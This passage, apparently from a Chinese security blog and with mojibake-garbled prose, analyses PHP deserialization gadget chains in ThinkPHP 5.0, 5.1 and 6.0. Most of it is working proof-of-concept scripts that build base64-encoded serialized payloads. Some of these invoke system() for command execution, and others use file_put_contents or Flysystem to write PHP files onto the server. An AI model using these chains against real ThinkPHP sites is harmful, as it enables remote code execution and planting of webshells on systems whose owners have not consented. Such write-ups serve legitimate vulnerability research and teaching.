keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$queryObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hasoneObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$queryObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pivotObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$hasoneObj</span><span class="token punctuation">,</span> <span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivotObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆæ•ˆæœï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913153902668.png" alt="image-20240913153902668" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913155426725.png" alt="image-20240913155426725" /></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.Xååºåˆ—åŒ–åˆ©ç”¨é“¾.md</a></p><p>è¿™ç¯‡blogè¿˜æåˆ°äº†å¦‚æœç›®å½•ä¸å…è®¸å†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡å…¶ä»–æ–¹æ³•åˆ›å»ºæ–‡ä»¶ã€‚</p><h3 id="å››-å…¶ä»–ç‰ˆæœ¬çš„ååºåˆ—åŒ–é“¾åˆ†æ"><a class="markdownIt-Anchor" href="#å››-å…¶ä»–ç‰ˆæœ¬çš„ååºåˆ—åŒ–é“¾åˆ†æ"></a> å››ã€å…¶ä»–ç‰ˆæœ¬çš„ååºåˆ—åŒ–é“¾åˆ†æ</h3><p>æµ‹è¯•å‘ç°5.0çš„ä¸åŒå°ç‰ˆæœ¬çš„å‡½æ•°ç¨å¾®æœ‰äº›åŒºåˆ«</p><p>åé¢æœ‰ç©ºå†åˆ†æï¼Œ å¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p><h2 id="2thinkphp-51x-ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#2thinkphp-51x-ååºåˆ—åŒ–"></a> â‘¡ThinkPHP 5.1.x ååºåˆ—åŒ–</h2><p>TP5.1çš„ååºåˆ—åŒ–æ¯”TP5.0çš„è¦ç®€å•çš„ä¸å°‘</p><p>æµ‹è¯•ç‰ˆæœ¬ï¼š5.1.37</p><h3 id="ä¸€-ååºåˆ—åŒ–è°ƒé€šè¿‡ç¨‹"><a class="markdownIt-Anchor" href="#ä¸€-ååºåˆ—åŒ–è°ƒé€šè¿‡ç¨‹"></a> ä¸€ã€ååºåˆ—åŒ–è°ƒé€šè¿‡ç¨‹</h3><h4 id="1-å…¥å£ç‚¹"><a class="markdownIt-Anchor" href="#1-å…¥å£ç‚¹"></a> 1. å…¥å£ç‚¹</h4><p>å…¥å£å¯»æ‰¾__destructæ–¹æ³•ï¼Œä¸TP5.0ç›¸åŒ</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135349542.png" alt="image-20240914135349542" /></p><h4 id="2-tostring-é­”æœ¯æ–¹æ³•"><a class="markdownIt-Anchor" href="#2-tostring-é­”æœ¯æ–¹æ³•"></a> 2. ToString é­”æœ¯æ–¹æ³•</h4><p>ä¾æ—§æ˜¯æ­¤æ–¹æ³•è§¦å‘tostring</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135424121.png" alt="image-20240914135424121" /></p><h4 id="3-ä¸­é€”åˆ©ç”¨ç‚¹"><a class="markdownIt-Anchor" href="#3-ä¸­é€”åˆ©ç”¨ç‚¹"></a> 3. ä¸­é€”åˆ©ç”¨ç‚¹</h4><p>è¿™é‡Œçœ‹ä¸€ä¸‹getAttræ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135839679.png" alt="image-20240914135839679" /></p><p>è¿™é‡Œæœ‰ä¸€å¤„å‡½æ•°å˜é‡</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135922286.png" alt="image-20240914135922286" /></p><h4 id="4æ„é€ ä¸­é€”æ¡ä»¶"><a class="markdownIt-Anchor" href="#4æ„é€ ä¸­é€”æ¡ä»¶"></a> 4.æ„é€ ä¸­é€”æ¡ä»¶</h4><p>è¿™æ¡å‡½æ•°æ–¹æ³•çš„popé“¾çš„æ¡ä»¶å¾ˆå¥½æ„é€ ï¼š</p><ol><li>toarrayæ–¹æ³•çš„é€»è¾‘ï¼Œå¯ä»¥ç›´æ¥è¿›å…¥ï¼Œåªè¦èµ‹å€¼dataå°±å¯ä»¥ï¼Œå°±å¯ä»¥è¿›å…¥ä¸‹å›¾ä¸­çš„getAttræ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914154545662.png" alt="image-20240914154545662" /></p><ol start="2"><li>ifé€»è¾‘å¯ä»¥èµ‹å€¼ç±»å‚æ•°è§£å†³ï¼Œçœ‹ä¸€ä¸‹<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi mathvariant="normal">å’Œ</mi></mrow><annotation encoding="application/x-tex">closureå’Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">å’Œ</span></span></span></span>valueçš„å€¼å¦‚ä½•è·å–å³å¯ã€‚</li></ol><p>valueæ˜¯æ‹¿çš„dataæ•°ç»„çš„nameé”®å€¼å¯¹åº”çš„å€¼</p><p>closureæ˜¯æ‹¿çš„withAttræ•°ç»„çš„nameé”®å€¼å¯¹åº”çš„å€¼</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914154708798.png" alt="image-20240914154708798" /></p><h3 id="äºŒ-pocç¼–å†™"><a class="markdownIt-Anchor" href="#äºŒ-pocç¼–å†™"></a> äºŒã€POCç¼–å†™</h3><p>å†™ä¹‹å‰æ³¨æ„ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>PHPä¸­å‡½æ•°å‚æ•°è¶…å‡ºæ—¶ä¼šå¿½ç•¥ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç†è§£æˆå¯ä»¥è°ƒç”¨ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">closure(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>value)ï¼Œå½“ç„¶è¿™é‡Œæƒ…å†µå¯èƒ½æ›´å¥½ä¸€ç‚¹ï¼Œå› ä¸ºå›¾ä¸­çš„$this-&gt;dataå…¶å®ä¹Ÿæ˜¯å¯æ§çš„ã€‚</li><li>å†™pocæ—¶ï¼Œå› ä¸ºè§¦å‘ç‚¹çš„ç±»æ˜¯traitçš„ï¼Œè€Œuseè¿™äº›ç±»çš„Modelæ˜¯æŠ½è±¡ç±»ï¼Œå†™pocæ—¶ï¼Œè¦æ‰¾å­ç±»ï¼Œå®šä¹‰å±æ€§çš„æ—¶å€™ï¼Œä¸€å®šè¦æŠŠå±æ€§å®šä¹‰åˆ°æŠ½è±¡ç±»é‡Œé¢ï¼Œè€Œä¸æ˜¯å®šä¹‰åœ¨å­ç±»é‡Œé¢ã€‚</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think\process\pipes&#123;Class Windows&#123;private $files;function __construct($a)&#123;$this-&gt;files &#x3D; [$a];&#125;&#125;&#125;namespace think\model&#123;Class Pivot&#123;private $data &#x3D; [&#39;system&#39;&#x3D;&gt;&#39;calc&#39;];private $withAttr &#x3D; [&#39;system&#39; &#x3D;&gt; &#39;system&#39;];&#125;&#125;namespace&#123;$p &#x3D; new \think\model\Pivot();$w &#x3D; new \think\process\pipes\Windows($p);echo base64_encode(serialize($w));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆä¼˜ç¾çš„ä¸€æ¡é“¾</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914155309217.png" alt="image-20240914155309217" /></p><p>å¦‚æœæƒ³æ›´å®æˆ˜åŒ–ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©è°ƒç”¨file_put_contentsæ–¹æ³•ï¼Œå› ä¸ºä¸Šé¢ä¹Ÿåˆ†æè¿‡ï¼Œè¿™é‡Œçš„dataä¹Ÿæ˜¯å¯æ§çš„ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914161202840.png" alt="image-20240914161202840" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span><span class="token keyword">abstract</span> <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'914.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'file_put_contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸‰-å…¶ä»–ååºåˆ—åŒ–é“¾åˆ†æ"><a class="markdownIt-Anchor" href="#ä¸‰-å…¶ä»–ååºåˆ—åŒ–é“¾åˆ†æ"></a> ä¸‰ã€å…¶ä»–ååºåˆ—åŒ–é“¾åˆ†æ</h3><p>ä¸Šé¢åˆ†æçš„é“¾å…¶å®å¾ˆç®€å•ï¼Œå½“ç„¶5.1è¿˜æœ‰å¦ä¸€ä¸ªå¸¸è§çš„é“¾ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><p><a href="https://paper.seebug.org/1040/#_1">https://paper.seebug.org/1040/#_1</a></p><p>è¿™ä¸ªåˆ©ç”¨äº†TPçš„filterValueç±»ï¼ˆå˜é‡è¦†ç›–RCEé‚£é‡Œï¼‰ï¼Œæœ€ç»ˆè§¦å‘äº†callbackæ‰§è¡Œï¼Œæœ‰ç²¾åŠ›å†å­¦ä¹ ä¸€ä¸‹</p><h2 id="3thinkphp-52x-ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#3thinkphp-52x-ååºåˆ—åŒ–"></a> â‘¢ThinkPHP 5.2.x ååºåˆ—åŒ–</h2><p>æ­å»ºç¯å¢ƒå¤±è´¥äº†</p><p>çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å‚è€ƒä¸€ä¸‹å§ã€‚</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.Xååºåˆ—åŒ–åˆ©ç”¨é“¾.md</a></p><p>å®é™…ä¸Šå’Œä¸Šé¢åˆ†æçš„5.1.xçš„é“¾æ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="4-thinkphp60x-ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#4-thinkphp60x-ååºåˆ—åŒ–"></a> â‘£ ThinkPHP6.0.x ååºåˆ—åŒ–</h2><p>tp6.0.xç½‘ä¸Šè¯´ä½ç‰ˆæœ¬å¯ä»¥å¤ç”¨5.1.xååŠéƒ¨åˆ†çš„é“¾æ¥ã€‚</p><p><a href="https://xz.aliyun.com/t/12630">https://xz.aliyun.com/t/12630</a> å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« </p><p>ä½†æ˜¯æœ¬åœ°å®‰è£…å‘ç°ï¼Œä½ç‰ˆæœ¬å®é™…ä¸Šä¹Ÿå·²ç»patchè¿‡äº†ï¼Œå› æ­¤å»æ‰¾å…¶ä»–é“¾</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914174452400.png" alt="image-20240914174452400" /></p><p>åé¢çš„é“¾çš„æµ‹è¯•ç‰ˆæœ¬6.0.1</p><h3 id="ä¸€-ååºåˆ—åŒ–è°ƒé€šè¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#ä¸€-ååºåˆ—åŒ–è°ƒé€šè¿‡ç¨‹-2"></a> ä¸€ã€ååºåˆ—åŒ–è°ƒé€šè¿‡ç¨‹</h3><p>å®é™…ä¸Šå‘ç°åœ¨å¦ä¸€ä¸ªé€»è¾‘ä¸Šï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å˜é‡å‡½æ•°ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914174922818.png" alt="image-20240914174922818" /></p><p>é‚£å…ˆæ‰¾toStringæ–¹æ³•è§¦å‘åœ°ã€‚</p><h4 id="1å¯»æ‰¾tostringæ–¹æ³•è§¦å‘ç‚¹"><a class="markdownIt-Anchor" href="#1å¯»æ‰¾tostringæ–¹æ³•è§¦å‘ç‚¹"></a> 1.å¯»æ‰¾toStringæ–¹æ³•è§¦å‘ç‚¹</h4><p>å­—ç¬¦ä¸²æ‹¼æ¥è§¦å‘toStringæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914180702711.png" alt="image-20240914180702711" /></p><p>è§¦å‘toStringçš„åœ¨æ­¤å¤„ï¼Œä¸Šé¢æœ€åä¸€æ­¥çš„$this-&gt;db()æ–¹æ³•ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143311766.png" alt="image-20240918143311766" /></p><h3 id="äºŒ-pocç¼–å†™-2"><a class="markdownIt-Anchor" href="#äºŒ-pocç¼–å†™-2"></a> äºŒã€POCç¼–å†™</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918142310829.png" alt="image-20240918142310829" /></p><h3 id="ä¸‰-å…¶ä»–ååºåˆ—åŒ–é“¾åˆ†æ-2"><a class="markdownIt-Anchor" href="#ä¸‰-å…¶ä»–ååºåˆ—åŒ–é“¾åˆ†æ-2"></a> ä¸‰ã€å…¶ä»–ååºåˆ—åŒ–é“¾åˆ†æ</h3><p>åˆ†æä¸€ä¸‹å¦ä¸€ä¸ªå†™æ–‡ä»¶çš„åˆ©ç”¨é“¾</p><p>ä¸Šé¢åˆ†æè¿‡_toStringçš„è§¦å‘ï¼Œè¿™é‡Œæ‰¾ä¸€ä¸‹toStringçš„å…¶ä»–åˆ©ç”¨ä½ç½®ï¼š</p><p>ä¸‹å›¾ä¸­çš„ç±»æ˜¯å¯ä»¥èµ°åˆ°__callæ–¹æ³•çš„</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918100505845.png" alt="image-20240918100505845" /></p><p>__callæ–¹æ³•çš„åˆ©ç”¨ç‚¹å°±å¤šäº†ï¼Œç»§ç»­æ‰¾ä¸€ä¸‹</p><p>outputç±»å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„writeæ–¹æ³•ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918105538579.png" alt="image-20240918105538579" /></p><p>è·Ÿå…¥åˆ°fileç±»ï¼Œä¾æ—§æ˜¯ä»»æ„ç±»çš„writeæ–¹æ³•ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å·²ç»å¯æ§äº†ã€‚ç¬¬äºŒä¸ªå‚æ•°ä¼šæ˜¯æˆ‘ä»¬ä¸Šé¢writeä¼ çš„ç¬¬ä¸€ä¸ªmessageså‚æ•°ã€‚ï¼ˆå°±æ˜¯æœ€åˆè§¦å‘ç‚¹çš„å‚æ•°ï¼‰</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918105748941.png" alt="image-20240918105748941" /></p><p>æ¥ä¸‹æ¥ç»§ç»­æ‰¾ä¸¤ä¸ªå‚æ•°çš„writeæ–¹æ³•ã€‚fileç±»å®Œç¾ç¬¦åˆè¦æ±‚ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918110305467.png" alt="image-20240918110305467" /></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  namespace think\model\concern&#123;      trait Attribute&#123;          private $data &#x3D; [&#39;test&#39;];     &#125;  &#125;  namespace think\view\driver&#123;      class Php&#123;&#125;  &#125;namespace think\session\driver&#123;    class File&#123;    &#125;&#125;namespace League\Flysystem&#123;    class File&#123;        protected $path;        protected $filesystem;        public function __construct($File)&#123;            $this-&gt;path&#x3D;&#39;test.php&#39;;            $this-&gt;filesystem&#x3D;$File;        &#125;    &#125;&#125;namespace think\console&#123;    use League\Flysystem\File;    class Output&#123;        protected $styles&#x3D;[];        private $handle;        public function __construct($File)&#123;            $this-&gt;styles[]&#x3D;&#39;getDomainBind&#39;;            $this-&gt;handle&#x3D;new File($File);        &#125;    &#125;&#125;  namespace think&#123;      abstract class Model&#123;          use model\concern\Attribute;          private $lazySave;          protected $withEvent;          protected $table;          function __construct($cmd,$File)&#123;              $this-&gt;lazySave &#x3D; true;              $this-&gt;withEvent &#x3D; false;              $this-&gt;table &#x3D; new route\Url(new Middleware,new console\Output($File),$cmd);          &#125;      &#125;      class Middleware&#123;          public $request &#x3D; 2333;      &#125;   &#125;  namespace think\model&#123;      use think\Model;      class Pivot extends Model&#123;&#125;   &#125;  namespace think\route&#123;      class Url      &#123;          protected $url &#x3D; &#39;a:&#39;;          protected $domain;          protected $app;          protected $route;          function __construct($app,$route,$cmd)&#123;              $this-&gt;domain &#x3D; $cmd;              $this-&gt;app &#x3D; $app;              $this-&gt;route &#x3D; $route;          &#125;      &#125;  &#125;  namespace&#123;      echo base64_encode(serialize(new think\Model\Pivot(&#39;&lt;?php phpinfo(); exit(); ?&gt;&#39;,new think\session\driver\File)));  &#125;<span aria-hidden="true" 